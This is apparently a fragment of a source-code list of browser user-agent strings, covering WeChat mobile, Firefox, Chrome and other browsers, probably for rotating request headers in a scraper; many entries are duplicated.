     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
